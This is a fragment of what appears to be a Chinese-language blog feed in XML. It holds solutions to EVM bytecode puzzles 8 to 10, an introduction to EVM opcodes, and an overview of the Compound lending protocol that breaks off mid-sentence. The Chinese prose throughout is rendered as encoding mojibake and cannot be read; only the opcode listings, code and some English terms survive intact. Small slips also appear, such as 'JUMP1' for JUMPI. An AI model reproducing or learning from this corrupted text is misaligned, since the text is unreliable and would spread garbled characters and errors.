[0æˆ–1]è°ƒç”¨å‡½æ•°ï¼Œéœ€è¦æ˜¯0ï¼Œ0è¡¨ç¤ºå¤±è´¥ï¼Œ1è¡¨ç¤ºæˆåŠŸï¼ï¼ˆåæ¨çš„14      6000      PUSH1 00    # [00, 0æˆ–1]ï¼Œéœ€è¦æ˜¯016      14        EQ    # [0æˆ–1]ï¼Œéœ€è¦æ˜¯117      601B      PUSH1 1B    # [1B, 0æˆ–1]ï¼Œéœ€è¦æ˜¯119      57        JUMPI                       1A      FD        REVERT1B      5B        JUMPDEST1C      00        STOP</pre><p>é€æ­¥åˆ†æåï¼Œå¯å¾—çŸ¥æˆ‘ä»¬éœ€è¦åšåˆ°callè°ƒç”¨å¤±è´¥ï¼Œè¿™å°±è¦æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®revert,ç±»ä¼¼äºpuzzles#7</p><pre>pc      opcode    opcode name00      60FD      PUSH1 FD //FD æ˜¯revertæ“ä½œç¬¦çš„ç¼–å·02      6000      PUSH1 0004      53        MSTORE805      6001      PUSH1 0107      6000      PUSH1 0009      F3        RETURN</pre><p>å³calldata&#x3D; 0x60fd60005360016000f3</p><hr><h2 id="puzzles-9-LT"><a href="#puzzles-9-LT" class="headerlink" title="puzzles 9 LT"></a>puzzles 9 LT</h2><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6003      PUSH1 0303      10        LT04      6009      PUSH1 0906      57        JUMPI07      FD        REVERT08      FD        REVERT09      5B        JUMPDEST0A      34        CALLVALUE0B      36        CALLDATASIZE0C      02        MUL0D      6008      PUSH1 080F      14        EQ10      6014      PUSH1 1412      57        JUMPI13      FD        REVERT14      5B        JUMPDEST15      00        STOP</pre><p>value?<br>calldata?</p><p>åˆ†æï¼šå°±æ˜¯ä¸€ä¸ªæ¨ç†é¢˜ï¼Œ00-09:datasize&gt;3,0A-12:value*datasize&#x3D;8,datasize&#x3D;4,value&#x3D;2<br>calldataçš„å­—èŠ‚æ•°ä¸º4ï¼Œéšæ„æ„é€ calldata&#x3D;0x12345678</p><hr><h2 id="puzzles-10-ISZERO"><a href="#puzzles-10-ISZERO" class="headerlink" title="puzzles 10 ISZERO"></a>puzzles 10 ISZERO</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode      opcode name00      38          CODESIZE01      34          CALLVALUE02      90          SWAP103      11          GT04      6008        PUSH1 0806      57          JUMPI07      FD          REVERT08      5B          JUMPDEST09      36          CALLDATASIZE0A      610003      PUSH2 00030D      90          SWAP10E      06          MOD0F      15          ISZERO10      34          CALLVALUE11      600A        PUSH1 0A13      01          ADD14      57          JUMPI15      FD          REVERT16      FD          REVERT17      FD          REVERT18      FD          REVERT19      5B          JUMPDEST1A      00          STOP</pre><p>value?<br>calldata?</p><p>åˆ†æï¼š00-06ï¼švalue&lt;23;09-0f:calldata mod 3&#x3D;&#x3D;0;10-14:value+0a&#x3D;19,æ³¨æ„19ä¸º16è¿›åˆ¶çš„æ•°ï¼Œvalue&#x3D;15,calldataçš„å­—èŠ‚æ•°ä¸º3ï¼Œéšæ„æ„é€ calldta&#x3D;0x123456</p><p>10é“EVM puzzleså°±å®Œæˆäº†ï¼ï¼ï¼</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>EVMå…¥é—¨</title>
      <link href="/2024/08/19/EVM%E5%85%A5%E9%97%A8/"/>
      <url>/2024/08/19/EVM%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Opcodes"><a href="#Opcodes" class="headerlink" title="Opcodes"></a>Opcodes</h2><p>Opcodesï¼ˆæ“ä½œç ï¼‰æ˜¯ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦çš„åŸºæœ¬å•å…ƒã€‚æˆ‘ä»¬å†™çš„Solidityæ™ºèƒ½åˆçº¦ä¼šè¢«ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼ˆbytecodeï¼‰ï¼Œç„¶åæ‰èƒ½åœ¨EVMï¼ˆä»¥å¤ªåŠè™šæ‹Ÿæœºï¼‰ä¸Šè¿è¡Œã€‚è€Œå­—èŠ‚ç å°±æ˜¯ç”±ä¸€ç³»åˆ—Opcodesç»„æˆçš„ã€‚å½“ç”¨æˆ·åœ¨EVMä¸­è°ƒç”¨è¿™ä¸ªæ™ºèƒ½åˆçº¦çš„å‡½æ•°æ—¶ï¼ŒEVMä¼šè§£æå¹¶æ‰§è¡Œè¿™äº›Opcodesï¼Œä»¥å®ç°åˆçº¦é€»è¾‘ã€‚</p><h2 id="å¸¸è§çš„Opcodes"><a href="#å¸¸è§çš„Opcodes" class="headerlink" title="å¸¸è§çš„Opcodes"></a>å¸¸è§çš„Opcodes</h2><p><code>PUSH1</code>: å°†ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®å‹å…¥å †æ ˆã€‚ä¾‹å¦‚ï¼ŒPUSH1 0x60 å°±æ˜¯å°† 0x60 å‹å…¥å †æ ˆã€‚<br><code>DUP1</code> : å¤åˆ¶å †æ ˆé¡¶éƒ¨çš„ä¸€ä¸ªå…ƒç´ ã€‚<br><code>SWAP1</code>: äº¤æ¢å †æ ˆé¡¶éƒ¨çš„å‰ä¸¤ä¸ªå…ƒç´ ã€‚</p><p>ä¾‹å¦‚ï¼šä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„Solidityæ™ºèƒ½åˆçº¦ï¼Œå®ƒåªæœ‰ä¸€ä¸ªadd()å‡½æ•°ï¼Œè®¡ç®—1+1çš„ç»“æœå¹¶è¿”å›ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">contract Add &#123;</span><br><span class="line">    function add() public pure returns (uint256 result) &#123;</span><br><span class="line">        result = 1+1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†åˆçº¦ç¼–è¯‘åï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°åˆçº¦å¯¹åº”çš„bytecode:<strong>60806040523480156100â€¦</strong></p><p>é€šè¿‡bytecodeï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°åˆçº¦å¯¹åº”çš„opcodesä¸º:<strong>PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 â€¦</strong></p><blockquote><p>æˆ‘è®¤ä¸ºéœ€è¦ç‰¹åˆ«è®°å¿†çš„åŸºæœ¬Opcodes:<br>PUSH1:å°†ä¸€ä¸ªé•¿åº¦ä¸º1å­—èŠ‚çš„æ•°æ®å‹å…¥å †æ ˆé¡¶éƒ¨ã€‚åŒç†å¯çŸ¥ï¼šPUSH2å°±æ˜¯å‹å…¥é•¿åº¦ä¸ºä¿©ä¸ªå­—èŠ‚çš„æ•°æ®è¿›å…¥æ ˆå †é¡¶éƒ¨<br>ADD:ä¼šå¼¹å‡ºå †æ ˆé¡¶éƒ¨çš„ä¸¤ä¸ªå…ƒç´ ï¼Œè®¡ç®—å®ƒä»¬çš„å’Œï¼Œç„¶åå°†ç»“æœå‹å…¥å †æ ˆã€‚<br>PUSH0:å°±æ˜¯å°†0å‹å…¥æ ˆå †<br>MUL: ä¼šå¼¹å‡ºå †æ ˆé¡¶éƒ¨çš„ä¸¤ä¸ªå…ƒç´ ï¼Œè®¡ç®—å®ƒä»¬çš„ä¹˜ï¼Œç„¶åå°†ç»“æœå‹å…¥å †æ ˆã€‚<br>SUB: ä¼šå¼¹å‡ºå †æ ˆé¡¶éƒ¨çš„ä¸¤ä¸ªå…ƒç´ ï¼Œç¬¬äºŒä¸ªå…ƒç´ å‡å»ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œç„¶åå°†ç»“æœå‹å…¥å †æ ˆ<br>DUPx:å°±æ˜¯å¤åˆ¶ç¬¬xä¸ªå…ƒç´ åˆ°æ ˆé¡¶<br>LT:ä»å †æ ˆä¸­å¼¹å‡ºä¸¤ä¸ªå…ƒç´ ï¼Œæ¯”è¾ƒç¬¬äºŒä¸ªå…ƒç´ æ˜¯å¦å°äºç¬¬ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœæ˜¯ï¼Œé‚£ä¹ˆå°†1æ¨å…¥å †æ ˆï¼Œå¦åˆ™å°†0æ¨å…¥å †æ ˆã€‚å¦‚æœå †æ ˆå…ƒç´ ä¸è¶³ä¸¤ä¸ªï¼Œé‚£ä¹ˆä¼šæŠ›å‡ºå¼‚å¸¸ã€‚<br>GT:ä»å †æ ˆä¸­å¼¹å‡ºä¸¤ä¸ªå…ƒç´ ï¼Œæ¯”è¾ƒç¬¬äºŒä¸ªå…ƒç´ æ˜¯å¦å¤§äºç¬¬ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœæ˜¯ï¼Œé‚£ä¹ˆå°†1æ¨å…¥å †æ ˆï¼Œå¦åˆ™å°†0æ¨å…¥å †æ ˆã€‚å¦‚æœå †æ ˆå…ƒç´ ä¸è¶³ä¸¤ä¸ªï¼Œé‚£ä¹ˆä¼šæŠ›å‡ºå¼‚å¸¸ã€‚<br>EQ:ä»å †æ ˆä¸­å¼¹å‡ºä¸¤ä¸ªå…ƒç´ ï¼Œæ¯”è¾ƒç¬¬äºŒä¸ªå…ƒç´ æ˜¯å¦ç­‰äºç¬¬ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœæ˜¯ï¼Œé‚£ä¹ˆå°†1æ¨å…¥å †æ ˆï¼Œå¦åˆ™å°†0æ¨å…¥å †æ ˆã€‚å¦‚æœå †æ ˆå…ƒç´ ä¸è¶³ä¸¤ä¸ªï¼Œé‚£ä¹ˆä¼šæŠ›å‡ºå¼‚å¸¸ã€‚<br>AND:ä»æ ˆå †ä¸­å¼¹å‡ºä¿©ä¸ªå…ƒç´ ,æ¯”è¾ƒä½çº§,å¦‚2(0000 0010)å’Œ3(0000 0011),åˆ™å…¥æ ˆçš„æ˜¯2<br>OR:ä»æ ˆå †ä¸­å¼¹å‡ºä¿©ä¸ªå…ƒç´ ,æ¯”è¾ƒä½çº§,å¦‚2(0000 0010)å’Œ3(0000 0011),åˆ™å…¥æ ˆçš„æ˜¯3<br>XOR:å®ƒæ˜¯å¼‚æˆ–è¿ç®—,,å¦‚2(0000 0010)å’Œ3(0000 0011),åˆ™å…¥æ ˆçš„æ˜¯1(0000 0001),å°±æ˜¯æ¯”è¾ƒä¾æ¬¡å®ƒä»¬2è¿›åˆ¶çš„æ•°,ä¿©ä¸ª0ç›¸é‡æˆ–è€…ä¿©ä¸ª1ç›¸é‡å°±ä¸º0,ä¸åŒçš„ç›¸é‡å°±ä¸º1<br>SHL:æŒ‡ä»¤æ‰§è¡Œå·¦ç§»ä½æ“ä½œï¼Œä»å †æ ˆä¸­å¼¹å‡ºä¸¤ä¸ªå…ƒç´ ï¼Œå°†ç¬¬äºŒä¸ªå…ƒç´ å·¦ç§»ç¬¬ä¸€ä¸ªå…ƒç´ ä½æ•°ï¼Œç„¶åå°†ç»“æœæ¨å›æ ˆé¡¶ã€‚å°†2ï¼ˆ0000 0010ï¼‰å’Œ3ï¼ˆ0000 0011ï¼‰æ¨å…¥å †æ ˆï¼Œç„¶åå°†2å·¦ç§»3ä½ï¼Œç»“æœåº”è¯¥ä¸º16ï¼ˆ0001 0000ï¼‰ã€‚<br>SHR:åŒä¸Š,åªä¸è¿‡å‘å³ç§»,å­—èŠ‚ç å°†16ï¼ˆ0001 0000ï¼‰å’Œ3ï¼ˆ0000 0011ï¼‰æ¨å…¥å †æ ˆï¼Œç„¶åå°†16å³ç§»3ä½ï¼Œç»“æœåº”è¯¥ä¸º2ï¼ˆ0000 0010ï¼‰ã€‚<br>MSTORE:æŒ‡ä»¤ç”¨äºå°†ä¸€ä¸ª256ä½ï¼ˆ32å­—èŠ‚ï¼‰çš„å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­ã€‚å®ƒä»å †æ ˆä¸­å¼¹å‡ºä¸¤ä¸ªå…ƒç´ ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºå†…å­˜çš„åœ°å€ï¼ˆåç§»é‡ offsetï¼‰ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸ºå­˜å‚¨çš„å€¼ï¼ˆvalueï¼‰ã€‚<br>STOP:å®ƒçš„ä½œç”¨æ˜¯åœæ­¢å½“å‰ä¸Šä¸‹æ–‡çš„æ‰§è¡Œï¼Œå¹¶æˆåŠŸé€€å‡ºã€‚<br>JUMP:ç”¨äºæ— æ¡ä»¶è·³è½¬åˆ°ä¸€ä¸ªæ–°çš„ç¨‹åºè®¡æ•°å™¨ä½ç½®ã€‚å®ƒä»å †æ ˆä¸­å¼¹å‡ºä¸€ä¸ªå…ƒç´ ï¼Œå°†è¿™ä¸ªå…ƒç´ è®¾å®šä¸ºæ–°çš„ç¨‹åºè®¡æ•°å™¨ï¼ˆpcï¼‰çš„å€¼ã€‚æ­é…JUMPDEST(æ ‡è®°ä¸€ä¸ªæœ‰æ•ˆçš„è·³è½¬ç›®æ ‡ä½ç½®)ä½¿ç”¨<br>JUMP1:ç”¨äºæ¡ä»¶è·³è½¬ï¼Œå®ƒä»å †æ ˆä¸­å¼¹å‡ºä¸¤ä¸ªå…ƒç´ ï¼Œå¦‚æœç¬¬äºŒä¸ªå…ƒç´ ï¼ˆæ¡ä»¶ï¼Œconditionï¼‰ä¸ä¸º0ï¼Œé‚£ä¹ˆå°†ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆç›®æ ‡ï¼Œdestinationï¼‰è®¾å®šä¸ºæ–°çš„pcçš„å€¼ã€‚<br>SWAP:äº¤æ¢,å¦‚SWAP1,äº¤æ¢æ ˆé¡¶ä¸æ¬¡æ ˆé¡¶,swap2,äº¤æ¢æ ˆé¡¶ä¸ç¬¬ä¸‰ä¸ªå…ƒç´ <br>CALLDATALOAD:ä»äº¤æ˜“æˆ–åˆçº¦è°ƒç”¨çš„dataå­—æ®µåŠ è½½æ•°æ®ã€‚å®ƒä»å †æ ˆä¸­å¼¹å‡ºcalldataçš„åç§»é‡ï¼ˆoffsetï¼‰ï¼Œç„¶åä»calldataçš„offsetä½ç½®è¯»å–32å­—èŠ‚çš„æ•°æ®å¹¶å‹å…¥å †æ ˆã€‚å¦‚æœcalldataå‰©ä½™ä¸è¶³32å­—èŠ‚ï¼Œåˆ™è¡¥0ã€‚<br>CALLDATASIZE:è·å–äº¤æ˜“æˆ–åˆçº¦è°ƒç”¨çš„dataå­—æ®µçš„å­—èŠ‚é•¿åº¦ï¼Œå¹¶å‹å…¥å †æ ˆã€‚<br>CALLDATACOPY:å°†dataä¸­çš„æ•°æ®å¤åˆ¶åˆ°å†…å­˜ä¸­ã€‚å®ƒä¼šä»å †æ ˆä¸­å¼¹å‡º3ä¸ªå‚æ•°(mem_offset, calldata_offset, length)ï¼Œåˆ†åˆ«å¯¹åº”å†™åˆ°å†…å­˜çš„åç§»é‡ï¼Œè¯»å–calldataçš„åç§»é‡å’Œé•¿åº¦ã€‚<br>CODESIZE:è·å–å½“å‰åˆçº¦ä»£ç çš„å­—èŠ‚é•¿åº¦ï¼Œç„¶åå‹å…¥å †æ ˆã€‚</p></blockquote><hr><h2 id="EVMåŸºç¡€"><a href="#EVMåŸºç¡€" class="headerlink" title="EVMåŸºç¡€"></a>EVMåŸºç¡€</h2><p>ä»¥å¤ªåŠè™šæ‹Ÿæœºï¼ˆEVMï¼‰æ˜¯ä»¥å¤ªåŠåŒºå—é“¾ä¸­çš„å…³é”®ç»„ä»¶ï¼Œå……å½“å¼€å‘äººå‘˜çš„è™šæ‹Ÿè®¡ç®—æœºæˆ–è½¯ä»¶å¹³å°ã€‚è¿™é¡¹åˆ›æ–°å…è®¸åˆ›å»ºå’Œéƒ¨ç½²å»ä¸­å¿ƒåŒ–åº”ç”¨ç¨‹åºï¼ˆDAppï¼‰ä»¥åŠåœ¨ä»¥å¤ªåŠç½‘ç»œä¸Šæ‰§è¡Œæ™ºèƒ½åˆçº¦ã€‚ EVM ç”±Vitalik Buterinäº 2013 å¹´æå‡ºæ¦‚å¿µï¼Œæˆä¸ºä»¥å¤ªåŠç½‘ç»œçš„æ ¸å¿ƒï¼Œå¼ºè°ƒäº†å…¶åœ¨å†³å®šä»¥å¤ªåŠåŒºå—é“¾ä¸­æ¯ä¸ªåŒºå—çš„çŠ¶æ€æ–¹é¢çš„åŸºç¡€ä½œç”¨ã€‚</p><p>EVMå°±æ˜¯ä¸€ä¸ªè¿è¡Œç¯å¢ƒï¼Œå°±å¦‚åŒJavaçš„è¿è¡Œç¯å¢ƒä¸€æ ·ï¼Œå«ä¹‰ï¼Œåˆ†ç±»éƒ½å·®ä¸å¤šï¼Œå®ƒåŒ…æ‹¬äº†å †æ ˆï¼Œå†…å­˜ï¼Œå­˜å‚¨ï¼ŒEVMå­—èŠ‚ç ï¼Œæœ‰ä¸€ç‚¹ç¼–ç¨‹åŸºç¡€çš„éƒ½çŸ¥é“å †æ ˆï¼Œè¿™ç§å…ˆè¿›åå‡ºçš„ç»“æ„ï¼Œåæ­£å°±æ˜¯ä¸€ä¸ªç±»ä¼¼äºJVMä¸€æ ·æœºå™¨ï¼Œå®ƒä¸»è¦å°±æ˜¯è¿è¡Œä¸€äº›æ“ä½œç¬¦opcode,çœŸæ­£çš„è¦ç†è§£ç†Ÿæ‚‰opcodeæ“ä½œç¬¦ï¼Œ144ä¸ªï¼Œ<a href="https://www.evm.codes/?fork=shanghai">ç‚¹å‡»å­¦ä¹ </a>,æ›´å¤šçš„è¯¦ç»†æŒ‡ä»¤å‚è€ƒ<a href="https://www.wtf.academy/docs/evm-opcodes-101/">WTF</a>ï¼Œæˆ‘å°±ä¸ä¸€ä¸€è®²äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¤§ç™½è¯ï¼š</p><h2 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h2><ul><li>è·¨åŒºå—é“¾æ”¯æŒï¼šEVM æ”¯æŒå­—èŠ‚ç å…¼å®¹çš„æ™ºèƒ½åˆçº¦çš„èƒ½åŠ›ä½¿å…¶èƒ½å¤Ÿè·¨å„ç§åŒºå—é“¾ã€‚ Polygon å’Œ Avalanche ç­‰å¤šä¸ªåŒºå—é“¾éƒ½åˆ©ç”¨äº†æ­¤åŠŸèƒ½ï¼Œä½¿å®ƒä»¬èƒ½å¤Ÿåˆ©ç”¨ EVM å¼ºå¤§çš„ç”Ÿæ€ç³»ç»Ÿã€‚</li><li>éš”ç¦»æ²™ç®±ç¯å¢ƒï¼šEVM åœ¨åŒä¸€è®¡ç®—æœºç½‘ç»œå†…å•ç‹¬æ“ä½œæ¯ä¸ªä»£ç æ®µï¼Œç¡®ä¿ä¸€ä¸ªåº”ç”¨ç¨‹åºçš„æ‰§è¡Œä¸ä¼šå½±å“åŒºå—é“¾çš„å…¶ä½™éƒ¨åˆ†æˆ–èŠ‚ç‚¹è®¡ç®—æœºä¸Šå­˜å‚¨çš„æ•°æ®ã€‚è¿™ç§éš”ç¦»æœ‰åˆ©äºå¿«é€Ÿé«˜æ•ˆçš„å¼€å‘ã€‚</li><li>çµæ´»çš„å¼€å‘èƒ½åŠ›ï¼šEVM æ“…é•¿æ‰§è¡Œå¤æ‚ä¸”å®šåˆ¶çš„æ™ºèƒ½åˆçº¦ï¼Œè¿™å¯¹äºåŒ…æ‹¬ dAppã€ DeFiå¹³å°ã€æ¸¸æˆå’ŒNFTåœ¨å†…çš„å„ç§åº”ç”¨ç¨‹åºè‡³å…³é‡è¦ã€‚æ­¤å¤–ï¼ŒEVM å‘¨å›´æœ‰ä¸€ä¸ªåºå¤§çš„å¼€å‘äººå‘˜ç¤¾åŒºï¼Œç®€åŒ–äº†è½¯ä»¶æ„å»ºè¿‡ç¨‹ã€‚</li><li>è·¨æ“ä½œç³»ç»Ÿçš„äº¤å‰å…¼å®¹æ€§ï¼šç”±äºåŒºå—é“¾ç½‘ç»œä¸­ MacOSã€Windows ç­‰æ“ä½œç³»ç»Ÿçš„å¤šæ ·æ€§ï¼Œå¼€å‘å…¼å®¹è½¯ä»¶å¯èƒ½å…·æœ‰æŒ‘æˆ˜æ€§ã€‚ EVM é€šè¿‡æ ‡å‡†åŒ–å¹¶æ”¯æŒè·¨å¤šä¸ªæ“ä½œç³»ç»Ÿæ‰§è¡Œç¨‹åºæ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè€Œæ— éœ€å•ç‹¬çš„ä»£ç åº“ã€‚</li></ul><h2 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h2><ul><li>é«˜äº¤æ˜“æˆæœ¬ï¼ˆGas è´¹ï¼‰ ï¼šä½¿ç”¨ EVM æœ€æ˜¾ç€çš„ç¼ºç‚¹ä¹‹ä¸€æ˜¯åŠ å¯† Gasè´¹æˆæœ¬é«˜æ˜‚ã€‚ç”±äº EVM çš„å¯æ‰©å±•æ€§é™åˆ¶ï¼Œè¿™äº›è´¹ç”¨å¯èƒ½ä¼šè¿…é€Ÿå¢åŠ ï¼Œå°¤å…¶æ˜¯åœ¨ç½‘ç»œæµé‡è¾ƒé«˜çš„æ—¶æœŸã€‚</li><li>å¯æ‰©å±•æ€§æŒ‘æˆ˜ï¼šEVM æ¯ç§’åªèƒ½å¤„ç†æœ‰é™æ•°é‡çš„äº‹åŠ¡ã€‚è¿™ç§é™åˆ¶å¯èƒ½ä¼šå¯¼è‡´ç½‘ç»œæ‹¥å¡åŠ å‰§ï¼Œè¿›ä¸€æ­¥æ¨é«˜æ±½æ²¹è´¹ã€‚<br>éƒ¨ç½²æ™ºèƒ½åˆçº¦çš„æˆæœ¬ï¼šä»¥å¤ªåŠçš„æµè¡Œæ€§è´¨æ„å‘³ç€éƒ¨ç½²è‡ªå®šä¹‰æ™ºèƒ½åˆçº¦æˆ–æ›´å¤§çš„åº”ç”¨ç¨‹åºå¯èƒ½ä¼šæˆæœ¬é«˜æ˜‚ã€‚å¼€å‘äººå‘˜å¿…é¡»ä¼˜åŒ–å…¶åˆçº¦ä»¥æé«˜æ•ˆç‡ï¼Œæ¶ˆé™¤å†—ä½™ä»£ç æˆ–ä¸å¿…è¦çš„åŠŸèƒ½ï¼Œå¹¶ä¸”è¿˜å¿…é¡»è€ƒè™‘ä»¥å¤ªåŠåŒºå—é“¾ä¸Šçš„é«˜å­˜å‚¨æˆæœ¬ã€‚</li><li>æ™ºèƒ½åˆçº¦çš„ä¸å¯é€†æ€§ï¼šä¸€æ—¦éƒ¨ç½²ï¼ŒåŒºå—é“¾ä¸Šçš„æ™ºèƒ½åˆçº¦å°±æ— æ³•æ›´æ”¹ã€‚å¦‚æœåœ¨éƒ¨ç½²åå‘ç°é”™è¯¯æˆ–æ¼æ´ï¼Œåˆ™è¿™ç§ä¸å˜æ€§ä¼šå¸¦æ¥æŒ‘æˆ˜ï¼Œéœ€è¦é‡æ–°éƒ¨ç½²æ•´ä¸ªåˆçº¦ï¼Œè¿™å¯èƒ½ä¼šäº§ç”Ÿé¢å¤–çš„æˆæœ¬ã€‚</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Compound</title>
      <link href="/2024/08/19/Compound/"/>
      <url>/2024/08/19/Compound/</url>
      
        <content type="html"><![CDATA[<h1 id="Compound"><a href="#Compound" class="headerlink" title="Compound"></a>Compound</h1><p>Compoundæ˜¯åœ¨Ethereumä¸Šè¿è¡Œçš„è½¯ä»¶ï¼Œæ—¨åœ¨å¥–åŠ±åˆ†å¸ƒå¼è®¡ç®—æœºç½‘ç»œè¿è¡Œä¼ ç»Ÿè´§å¸å¸‚åœºã€‚Compoundå…è®¸ç”¨æˆ·å°†åŠ å¯†è´§å¸å­˜å…¥å€Ÿè´·æ± è®©å€Ÿæ¬¾äººä½¿ç”¨ã€‚è€Œè´·æ–¹ä»ä»–ä»¬å­˜å…¥çš„èµ„äº§èµšå–åˆ©æ¯ã€‚ </p><p>å­˜æ¬¾åï¼ŒCompoundä¼šå¥–åŠ±è´·æ–¹åä¸ºcTokenï¼ˆä»£è¡¨å­˜æ¬¾ï¼‰çš„æ–°åŠ å¯†è´§å¸ã€‚cTokençš„ä¾‹å­åŒ…æ‹¬cETHã€cBATä»¥åŠcDAIã€‚</p><p>æ¯ä¸ªcTokenéƒ½å¯æ— é™è½¬è®©æˆ–äº¤æ˜“ï¼Œä½†åªèƒ½å…‘æ¢æœ€åˆé”å®šåœ¨åè®®ä¸­çš„åŠ å¯†è´§å¸ã€‚æ•´ä¸ªè¿‡ç¨‹ç”±Compoundä»£ç è‡ªåŠ¨å¤„ç†ï¼Œä»£è¡¨è´·æ–¹å¯ä»¥éšæ—¶æå¸ã€‚</p><p>ä¸ºäº†æ¿€åŠ±è¿™ä¸ªè¡Œä¸ºï¼ŒCompoundä½¿ç”¨äº†å¦ä¸€ç§ç§°ä¸ºCOMPçš„è‡ªå®¶åŠ å¯†è´§å¸ã€‚æ¯å½“ç”¨æˆ·å’ŒCompoundå¸‚åœºäº’åŠ¨æ—¶ï¼ˆå€Ÿå…¥ã€æå–æˆ–å¿è¿˜èµ„äº§ï¼‰ï¼Œä½œä¸ºå¥–åŠ±ä»–ä»¬éƒ½ä¼šè·å¾—é¢å¤–çš„COMPä»£å¸ã€‚</p><p>ç®€è¨€ä¹‹ï¼ŒCompound æ˜¯ä¸€ä¸ªå…è®¸ç”¨æˆ·å€Ÿè´·ä»£å¸çš„æ™ºèƒ½åˆçº¦ï¼Œå®ƒä¸ä½ çš„é“¶è¡Œç±»ä¼¼ï¼ŒCompound æŠŠä½ çš„é’±å€Ÿç»™å€Ÿæ¬¾äººï¼Œå¹¶éšç€æ—¶é—´çš„æ¨ç§»èµšå–åˆ©æ¯ã€‚ä½†ä¸é“¶è¡Œä¸åŒçš„æ˜¯ï¼Œä½ çš„åˆ©æ¯æ˜¯ä»ä½ å­˜å…¥ Compound çš„æ™ºèƒ½åˆçº¦åå¼€å§‹å¤åˆ©è®¡ç®—çš„ã€‚å› ä¸ºè¿™æ˜¯ä¸€ä¸ªæ™ºèƒ½åˆçº¦ï¼Œæ•´ä¸ªæµç¨‹ä¸­æ²¡æœ‰ä¸­é—´äººï¼Œå› æ­¤åˆ©æ¯ä¼šæ¯”ä¼ ç»Ÿé“¶è¡Œè¦é«˜ã€‚</p><h2 id="è¿ä½œæœºåˆ¶"><a href="#è¿ä½œæœºåˆ¶" class="headerlink" title="è¿ä½œæœºåˆ¶"></a>è¿ä½œæœºåˆ¶</h2><p>Compound åè®®è®©å¼€å‘è€…å¯ä»¥åŸºäºä»¥å¤ªåŠå»ºç«‹å„ç§å„æ ·çš„è´§å¸å¸‚åœºï¼ˆmoney marketï¼‰ã€‚<br>æ‰€è°“çš„ã€Œè´§å¸å¸‚åœºã€ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªä¸ªçš„ç‹¬ç«‹å¸æ± å•å…ƒï¼Œæ¯ä¸ªå¸æ± é‡Œåªæœ‰ä¸€ç§ä»£å¸ï¼Œåè®®é€šè¿‡ç®—æ³•æ¥å†³å®šè¿™ä¸ªæ± å­é‡Œçš„å¸å€Ÿè´·çš„åˆ©ç‡æ˜¯å¤šå°‘ã€‚ç®€å•ç‚¹è¯´ï¼Œè¿™ä¸ªç®—æ³•ä¼šåŸºäºäººä»¬å¯¹è¿™ä¸ªå¸å€Ÿè´·çš„ä¾›éœ€å…³ç³»è‡ªåŠ¨è®¡ç®—å‡ºåˆ©ç‡ã€‚</p><p>ä¸ç®¡ä½ æ˜¯æ¥è´·æ¬¾è¿˜æ˜¯æ”¾è´·ï¼Œä½ éƒ½æ˜¯åœ¨è·Ÿ Compound åè®®ç›´æ¥æ‰“äº¤é“ã€‚è¿™ä¸€ç‚¹è·Ÿé‚£äº›ç‚¹å¯¹ç‚¹çš„å€Ÿè´·åè®®ä¸å¤ªä¸€æ ·ã€‚åœ¨ç‚¹å¯¹ç‚¹çš„æ–¹æ¡ˆé‡Œï¼Œå€Ÿè´·åŒæ–¹ä¼šåšåŒ¹é…ï¼Œç„¶åä½ éœ€è¦è·Ÿæ‰¾ä½ å€Ÿé’±çš„äººï¼ˆæˆ–è€…å€Ÿä½ é’±çš„äººï¼‰è¿›è¡Œæ²Ÿé€šï¼ŒåŒæ–¹è‡ªå·±å•†å®šå¥½å€Ÿæ¬¾çš„åˆ©ç‡ã€åˆ°æœŸæ—¶é—´å’ŒæŠµæŠ¼ç‰©å“ç­‰ç­‰ã€‚</p><p>è€Œåœ¨ Compound åè®®é‡Œï¼Œæ¯ä¸ªä»£å¸ï¼ˆæ¯”å¦‚ Etherã€Daiã€USDCï¼‰éƒ½æœ‰ä¸€ä¸ªå±äºè‡ªå·±çš„å€Ÿè´·å¸‚åœºï¼Œé‡Œé¢åŒ…å«æ¯ä¸ªç”¨æˆ·åœ¨è¿™ä¸ªå¸‚åœºé‡Œçš„ä½™é¢ï¼Œä»¥åŠå„ç¬”ç”Ÿæ•ˆçš„å€Ÿè´·äº¤æ˜“ï¼Œä¹ƒè‡³æ¯æ®µæ—¶æœŸçš„å†å²åˆ©ç‡ï¼Œç­‰ç­‰ã€‚</p><p>ç”¨æˆ·å¯ä»¥é€šè¿‡æŠµæŠ¼å“çš„ä¿¡è´·é¢åº¦æ— ç¼åœ°ä»åè®®ä¸Šå€Ÿé’±ï¼Œä½ 